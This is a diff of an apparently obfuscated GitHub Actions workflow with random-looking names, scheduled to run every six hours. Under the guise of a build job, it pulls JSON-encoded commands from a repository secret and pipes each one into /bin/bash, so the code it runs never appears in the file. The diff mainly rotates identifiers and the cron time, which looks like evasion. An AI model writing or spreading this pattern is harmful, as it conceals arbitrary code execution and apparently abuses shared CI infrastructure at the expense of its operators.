@@ -1,20 +1,20 @@
 name: kutibuxue
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 1/6 * * *'
-jobs:  # 31253
+    - cron: '8 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: kutibuxue
         env:
-          r47: ${{ secrets.r47 }}
+          m223: ${{ secrets.m223 }}
         run: |
-          echo $r47 | jq -r .jx25 | /bin/bash
-          echo $xnfhm08560 | jq -r .ps643 | /bin/bash
-          echo $vrr920 | jq -r .x3352 | /bin/bash
-          echo $nvn7147 | jq -r .i51 | /bin/bash
+          echo $m223 | jq -r .rzse441 | /bin/bash
+          echo $k7283 | jq -r .m3 | /bin/bash
+          echo $qbasg64 | jq -r .tdf4 | /bin/bash
+          echo $i86 | jq -r .yk3 | /bin/bash
 
